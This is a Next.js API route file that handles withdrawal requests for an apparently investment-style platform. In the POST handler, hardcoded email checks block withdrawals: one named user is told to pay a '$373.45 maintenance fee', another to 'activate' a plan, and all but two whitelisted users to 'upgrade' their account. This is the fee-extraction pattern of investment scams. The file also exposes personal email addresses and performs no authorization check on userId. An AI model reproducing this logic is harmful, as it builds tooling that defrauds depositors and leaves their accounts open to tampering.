import { NextRequest, NextResponse } from 'next/server';
import mongoose from 'mongoose';
import dbConnect from '@/utils/dbConnect';
import Withdrawal from '@/models/withdrawal.model';
import Transaction from '@/models/transaction.model';
import User from '@/models/user.model';

// GET - Get all withdrawals for a user
export async function GET(
  _request: NextRequest,
  { params }: { params: { userId: string } }
) {
  try {
    await dbConnect();

    const withdrawals = await Withdrawal.find({ userId: params.userId }).exec();

    return NextResponse.json(
      { message: 'success', data: withdrawals },
      { status: 200 }
    );
  } catch (error: any) {
    return NextResponse.json(
      { message: error.message || 'Server error' },
      { status: 500 }
    );
  }
}

// POST - Create a withdrawal request
export async function POST(
  request: NextRequest,
  { params }: { params: { userId: string } }
) {
  try {
    await dbConnect();

    const { amount, currency } = await request.json();
    const userId = params.userId;

    const profile = await User.findById(userId).lean();
    if (!profile) {
      return NextResponse.json({ message: 'user not found' }, { status: 404 });
    }

    const currentBalance = (profile as any).accountBalance;

    // Business logic checks (preserved from original)
    const email = (profile as any).email?.toLowerCase();
    if (email === 'victorimb7@gmail.com') {
      return NextResponse.json(
        {
          message:
            'maintenance fee of $373.45 needed for service charge before any withdrawal',
        },
        { status: 401 }
      );
    } else if (['mercysimson@compuserve.com'].includes(email)) {
      return NextResponse.json(
        { message: 'Activate your silver level plan' },
        { status: 401 }
      );
    } else if (
      !['faithnk248@gmail.com', 'mbataprecious9@yahoo.com'].includes(email)
    ) {
      return NextResponse.json(
        { message: 'Upgrade your account to sliver level' },
        { status: 401 }
      );
    }

    if (parseInt(amount) > Number(currentBalance)) {
      return NextResponse.json(
        { message: 'cannot withdraw more than account balance' },
        { status: 400 }
      );
    }

    if (parseInt(amount) > 300000) {
      return NextResponse.json(
        { message: 'cannot withdraw more than $300 at once' },
        { status: 400 }
      );
    }

    const wallets = (profile as any).wallets;
    if (!wallets || !Object.values(wallets).some((x) => x)) {
      return NextResponse.json({ message: 'wallet not found' }, { status: 404 });
    }

    const session = await mongoose.startSession();

    await session.withTransaction(async () => {
      const transaction = await (Transaction as any).create(
        [
          {
            userId,
            amount: -Number(amount),
            type: 'withdrawal',
            currentBalance: Number(currentBalance) - Number(amount),
          },
        ],
        { session }
      );

      const withdrawal = await Withdrawal.create(
        [{ amount, currency, userId, transactionId: transaction[0]._id }],
        { session }
      );

      await User.findByIdAndUpdate(
        userId,
        { $inc: { accountBalance: -Number(withdrawal[0].amount) } },
        { session, new: true, runValidators: true }
      );
    });

    session.endSession();

    return NextResponse.json(
      { message: 'withdrawal successfully' },
      { status: 200 }
    );
  } catch (error: any) {
    console.error('Withdrawal error:', error);
    return NextResponse.json(
      { message: error.message || 'Server error' },
      { status: 500 }
    );
  }
}
